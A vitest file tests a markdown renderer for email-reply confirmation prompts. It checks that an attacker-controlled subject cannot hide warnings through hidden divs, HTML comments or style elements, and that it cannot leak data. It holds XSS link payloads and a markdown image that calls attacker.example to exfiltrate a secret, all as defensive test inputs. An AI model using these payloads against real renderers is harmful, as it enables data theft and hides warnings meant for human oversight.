import { describe, it, expect } from 'vitest';
import { marked } from 'marked';
import { parseHTML } from 'linkedom';
import { renderPromptMarkdown, isSafePromptHref } from './prompt-markdown.js';

/**
 * The property under test is VISIBILITY, so it is measured on a parsed DOM and
 * never with `html.includes(text)`. That distinction is the whole point: the
 * suppression vectors leave the text present in the HTML string while putting
 * it inside a comment node or under a `hidden` ancestor — a string search calls
 * that a pass and misses the attack completely.
 */
function visibleText(html: string): string {
	const { document } = parseHTML(`<!doctype html><html><body>${html}</body></html>`);
	const parts: string[] = [];
	const walk = (node: Node): void => {
		for (const child of Array.from(node.childNodes) as Node[]) {
			// Comment nodes carry text that renders as nothing.
			if (child.nodeType === 8) continue;
			if (child.nodeType === 3) {
				// Adjacent text nodes are one run of text on screen — an escaped
				// `&lt;div&gt;` arrives split across three of them, so joining with a
				// separator would fabricate spaces that no reader ever sees.
				parts.push((child as Text).data);
				continue;
			}
			if (child.nodeType === 1) {
				const el = child as Element;
				const style = el.getAttribute('style') ?? '';
				if (el.hasAttribute('hidden') || /display\s*:\s*none/i.test(style)) continue;
				walk(child);
				parts.push('\n');
			}
		}
	};
	walk(document.body);
	return parts.join('').replace(/[^\S\n]+/g, ' ').replace(/\n+/g, '\n').trim();
}

/** The pre-fix chain, kept here as the control that keeps the assertions sharp. */
function renderOldChain(text: string): string {
	return marked.parse(text, { async: false }) as string;
}

// A mail_reply confirmation: every value after "Subject:" comes from an
// arbitrary external sender, so the subject is the attacker's field.
function replyPrompt(subject: string): string {
	return (
		`**Reply to email?**\n` +
		`**To:** sender@external.example\n` +
		`**Subject:** ${subject}\n\n` +
		`> quoted body text\n\n` +
		`⚠ **Body is 4000 chars — only the first 199 are shown above.**`
	);
}

describe('renderPromptMarkdown — suppression', () => {
	// Each case names the marker that MUST stay visible: the warning is the part
	// a human relies on, so hiding it is the actual attack.
	const VECTORS: ReadonlyArray<{ name: string; subject: string }> = [
		{ name: 'unclosed hidden div', subject: '<div hidden>' },
		{ name: 'display:none div', subject: '<div style="display:none">' },
		{ name: 'html comment', subject: 'Re: invoice\n\n<!--' },
		{ name: 'comment on one line', subject: 'Re: invoice <!--' },
		{ name: 'style element', subject: '<style>body{display:none}</style>' },
		{ name: 'nested hidden containers', subject: '<div hidden><span hidden>' },
		{ name: 'template element', subject: '<template>' },
	];

	for (const { name, subject } of VECTORS) {
		it(`keeps the warning visible against ${name}`, () => {
			const visible = visibleText(renderPromptMarkdown(replyPrompt(subject)));
			expect(visible).toContain('Body is 4000 chars');
			expect(visible).toContain('quoted body text');
		});
	}

	// Without this, the assertions above could pass simply because the measurement
	// can't see suppression at all. The old chain proves the vectors are real and
	// that `visibleText` detects them — at least one must actually suppress.
	it('control: the old chain really did suppress (so the measurement is sharp)', () => {
		const suppressed = VECTORS.filter(({ subject }) =>
			!visibleText(renderOldChain(replyPrompt(subject))).includes('Body is 4000 chars'),
		);
		expect(suppressed.map((v) => v.name)).not.toHaveLength(0);
	});

	it('renders raw html as visible text instead of structure', () => {
		const out = renderPromptMarkdown(replyPrompt('<div hidden>'));
		expect(out).not.toMatch(/<div/i);
		expect(visibleText(out)).toContain('<div hidden>');
	});
});

describe('renderPromptMarkdown — images and links', () => {
	it('never emits an img, so displaying a prompt fires no outbound request', () => {
		// marked's default renderer turns this into <img src="…">, which loads on
		// render — an exfil channel that needs no click.
		const out = renderPromptMarkdown(replyPrompt('![t](https://attacker.example/?d=secret)'));
		expect(out).not.toMatch(/<img/i);
		expect(out).not.toContain('attacker.example');
		expect(visibleText(out)).toContain('[image: t]');
	});

	it('strips unsafe link schemes but keeps their text', () => {
		for (const href of [
			'javascript:alert(1)',
			'JaVaScRiPt:alert(1)',
			'data:text/html,<script>alert(1)</script>',
			'vbscript:msgbox',
		]) {
			const out = renderPromptMarkdown(`Click [here](${href}) now`);
			expect(out).not.toMatch(/href=/i);
			expect(visibleText(out)).toContain('here');
		}
	});

	it('keeps safe links clickable', () => {
		const out = renderPromptMarkdown('See [docs](https://example.com/a?b=1)');
		expect(out).toContain('href="https://example.com/a?b=1"');
		expect(out).toContain('rel="noreferrer noopener"');
	});

	it('isSafePromptHref refuses relative and scheme-less targets', () => {
		expect(isSafePromptHref('https://example.com')).toBe(true);
		expect(isSafePromptHref('mailto:a@b.example')).toBe(true);
		expect(isSafePromptHref('/settings')).toBe(false);
		expect(isSafePromptHref('example.com')).toBe(false);
		expect(isSafePromptHref('javascript:alert(1)')).toBe(false);
	});
});

describe('renderPromptMarkdown — the prompt still reads as intended', () => {
	it('preserves the emphasis and blockquote the previews rely on', () => {
		const out = renderPromptMarkdown(replyPrompt('Quarterly report'));
		expect(out).toContain('<strong>');
		expect(out).toContain('<blockquote>');
		expect(visibleText(out)).toContain('Quarterly report');
	});

	it('gives every field its own line', () => {
		// Single newlines separate the fields; collapsing them into one run-on
		// paragraph is what makes a fake field easy to blend in.
		const out = renderPromptMarkdown(replyPrompt('Quarterly report'));
		expect(out).toMatch(/<br\s*\/?>/);
		expect(renderOldChain(replyPrompt('x'))).not.toMatch(/<br\s*\/?>/);
	});

	it('renders code fences without executing anything', () => {
		const out = renderPromptMarkdown('Payload:\n\n```json\n{"a":"<script>alert(1)</script>"}\n```');
		expect(out).toContain('<code');
		expect(out).not.toMatch(/<script/i);
		expect(visibleText(out)).toContain('alert(1)');
	});
});
